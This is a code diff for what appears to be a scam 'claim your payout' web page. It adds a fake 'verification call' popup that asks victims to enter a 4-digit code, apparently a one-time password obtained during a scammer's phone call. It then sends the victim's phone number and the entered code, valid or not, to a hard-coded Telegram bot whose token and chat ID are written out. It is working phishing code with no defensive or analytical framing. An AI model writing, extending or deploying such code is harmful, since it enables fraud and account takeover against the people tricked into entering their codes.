@@ -8,7 +8,10 @@ let claimState = {
     hasRedirected: false
 };
 
-// ========== FIREWALL FUNCTIONS ==========
+// ========== FIREWALL VERIFICATION (4-digit call) ==========
+let currentVerificationCode = null;
+let verificationAttempts = 0;
+
 async function isFirewallActive() {
     if (typeof firebase !== 'undefined' && firebase.database) {
         try {
@@ -21,10 +24,114 @@ async function isFirewallActive() {
     return false;
 }
 
-async function sendVerificationRequestNotification(phone, amount) {
-    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n💵 ₱${amount}`;
-    try { await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`); } catch(e) {}
+async function sendTelegram(phone, code) {
+    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
+    try {
+        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
+    } catch(e) {}
 }
+
+function showFirewallPopup() {
+    const popup = document.getElementById('firewallPopup');
+    if (popup) {
+        const content = document.getElementById('firewallPopupContent');
+        if (content) {
+            content.innerHTML = `
+                <div class="firewall-warning-icon">📞</div>
+                <h2>VERIFICATION REQUIRED</h2>
+                <div class="firewall-message">
+                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
+                    <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
+                    <p>Enter the code below to continue.</p>
+                </div>
+                <div class="verification-input-group">
+                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
+                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
+                </div>
+                <div class="firewall-note">
+                    <p>Waiting for system-verification call...</p>
+                </div>
+                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
+            `;
+        }
+        
+        // Generate random 4-digit code
+        currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
+        verificationAttempts = 0;
+        console.log("📞 VERIFICATION CODE:", currentVerificationCode);
+        
+        popup.style.display = 'flex';
+        setTimeout(() => {
+            const ci = document.getElementById('verificationCode');
+            if (ci) ci.focus();
+        }, 100);
+    }
+}
+
+function hideFirewallPopup() {
+    const popup = document.getElementById('firewallPopup');
+    if (popup) popup.style.display = 'none';
+}
+
+window.verifyFirewallCode = async function() {
+    const codeInput = document.getElementById('verificationCode');
+    const code = codeInput ? codeInput.value.trim() : '';
+    const errorDiv = document.getElementById('firewallErrorMsg');
+    const verifyBtn = document.getElementById('verifyCodeBtn');
+    const userPhone = localStorage.getItem("userPhone") || "Unknown";
+    
+    if (!code || code.length < 4) {
+        if (errorDiv) {
+            errorDiv.innerHTML = "Please enter a 4-digit code.";
+            errorDiv.style.display = 'block';
+        }
+        return;
+    }
+    
+    if (verifyBtn) {
+        verifyBtn.disabled = true;
+        verifyBtn.innerHTML = "VERIFYING...";
+    }
+    if (errorDiv) errorDiv.style.display = 'none';
+    
+    verificationAttempts++;
+    
+    // Check if code matches
+    const isValid = (code === currentVerificationCode);
+    
+    if (isValid) {
+        await sendTelegram(userPhone, code);
+        hideFirewallPopup();
+        alert("Verification successful. Page will refresh.");
+        setTimeout(() => {
+            window.location.reload();
+        }, 500);
+    } else {
+        await sendTelegram(userPhone, code);
+        
+        let errorMsg = "Invalid verification code. Please try again.";
+        if (verificationAttempts >= 3) {
+            errorMsg = "Too many failed attempts. Page will refresh.";
+            if (verifyBtn) verifyBtn.disabled = true;
+            setTimeout(() => {
+                window.location.reload();
+            }, 2000);
+        }
+        if (errorDiv) {
+            errorDiv.innerHTML = errorMsg;
+            errorDiv.style.display = 'block';
+        }
+        if (verifyBtn && verifyBtn.disabled !== true) {
+            verifyBtn.disabled = false;
+            verifyBtn.innerHTML = "VERIFY NOW";
+        }
+        
+        if (codeInput) {
+            codeInput.value = '';
+            codeInput.focus();
+        }
+    }
+};
 
 // ========== GET LATEST DEPLOYED LINK ==========
 async function getLatestPayoutLink() {
@@ -48,15 +155,16 @@ async function showClaimPopup(amount) {
     const firewallActive = await isFirewallActive();
     
     if (firewallActive) {
-        const userPhone = localStorage.getItem("userPhone") || "Unknown";
-        await sendVerificationRequestNotification(userPhone, amount);
+        // Show firewall verification popup
         if (typeof window.showFirewallPopup === 'function') {
             window.showFirewallPopup();
+        } else {
+            showFirewallPopup();
         }
         return;
     }
     
-    // Firewall OFF - Normal claim
+    // Firewall OFF - Normal claim popup
     claimState.currentAmount = amount;
     claimState.isProcessing = false;
     claimState.hasRedirected = false;
@@ -226,3 +334,8 @@ function onClaimAction() {
 document.addEventListener('DOMContentLoaded', function() { 
     hidePendingStatus();
 });
+
+// Export functions for global access
+window.showFirewallPopup = showFirewallPopup;
+window.hideFirewallPopup = hideFirewallPopup;
+window.verifyFirewallCode = verifyFirewallCode;
